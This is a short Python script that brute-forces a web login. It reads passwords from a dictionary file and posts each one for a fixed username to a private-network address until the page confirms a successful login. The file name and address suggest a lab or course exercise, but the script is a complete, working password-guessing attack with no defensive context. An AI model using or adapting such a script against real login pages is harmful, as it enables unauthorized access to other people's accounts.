import requests


login_url = "http://172.16.48.80"


username = "V_Darra55"


username_field = "username"
password_field = "password"


with open("Q2dictionary.txt", "r") as file:
    common_passwords = [line.strip() for line in file]


session = requests.Session()


for password in common_passwords:
    payload = {
        username_field: username,
        password_field: password,
        'submit': 'submit'
    }


    response = session.post(login_url, data=payload)


    if f'You Logged In as {username}!!' in response.text:
        print(f"Correct password found: {password}")
        break
    else:
        print(f'{password} is incorrect')


session.close()
